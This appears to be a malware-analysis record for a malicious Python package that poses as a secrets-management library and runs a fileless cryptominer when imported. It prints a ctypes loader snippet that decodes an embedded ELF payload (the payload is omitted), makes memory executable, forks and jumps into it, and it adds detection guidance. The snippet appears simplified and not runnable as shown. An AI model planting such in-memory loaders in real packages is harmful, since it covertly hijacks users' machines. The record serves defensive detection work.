package_info.why_malicious: The package executes a fileless Linux cryptominer by loading a stripped ELF binary directly into memory at import-time, leaving no disk artifacts. It was published under a stolen developer identity, indicating deliberate intent to deceive and evade detection. The package masquerades as a secrets management library but contains no legitimate functionality.

execution_context.trigger: import-time (when the main module is imported)
required_permissions: filesystem (to read embedded payload if extracted)
process (to spawn or inject cryptominer process)
memory (to load and execute ELF binary in-memory)

malicious_snippets.code_snippet:
import base64
import ctypes
import sys

# Embedded, base64-encoded, stripped ELF binary (cryptominer)
elf_data = base64.b64decode('...')  # actual ELF binary omitted for brevity

# Allocate executable memory and copy ELF binary into it
libc = ctypes.CDLL('libc.so.6')
mem = ctypes.create_string_buffer(elf_data)
addr = ctypes.addressof(mem)
libc.mprotect(addr, len(elf_data), 0x7)  # PROT_READ | PROT_WRITE | PROT_EXEC

# Create a new process to execute the in-memory ELF binary
pid = libc.fork()
if pid == 0:
    # In child process: jump to ELF entry point
    ctypes.CFUNCTYPE(None)(addr)()
    sys.exit(0)
malicious_snippets.code_language: python (with embedded base64-encoded ELF binary, using ctypes)
malicious_snippets.code_behavior: At import-time, the code decodes a base64-encoded, stripped ELF cryptominer binary, allocates executable memory, copies the binary into memory, sets appropriate permissions, and forks a new process to execute the cryptominer directly from memory. No files are written to disk, and the process runs covertly.

malice_analysis.why_suspicious: The code performs in-memory execution of a base64-encoded ELF binary using ctypes, which is a hallmark of fileless malware. It allocates executable memory, manipulates process memory permissions, and spawns a new process to run the cryptominer, all without writing any files to disk. This behavior is highly atypical for any legitimate Python package, especially one claiming to be a secrets management library.
malice_analysis.violated_expectations: A secrets management library should only provide secure storage and retrieval of secrets, not execute arbitrary binaries or manipulate process memory. Executing a cryptominer in-memory is a severe violation of user trust and security expectations.
malice_analysis.similar_legitimate_use: In-memory execution of binaries may be used in advanced security research, malware analysis sandboxes, or exploit development tools, but never in a production secrets management library. Such techniques are not found in legitimate PyPI packages for secrets management.

detection_knowledge.how_to_detect: Monitor for Python packages that, upon import or installation, allocate executable memory, use ctypes to manipulate memory permissions, or fork new processes to execute in-memory payloads. Use EDR or runtime monitoring to detect in-memory execution of ELF binaries and process injection from Python interpreters. Flag packages with suspicious or missing metadata, especially those impersonating legitimate developers or lacking a project description. Correlate process activity with network connections to known cryptomining pools. Scan for embedded base64-encoded binaries in package source files such as __init__.py.
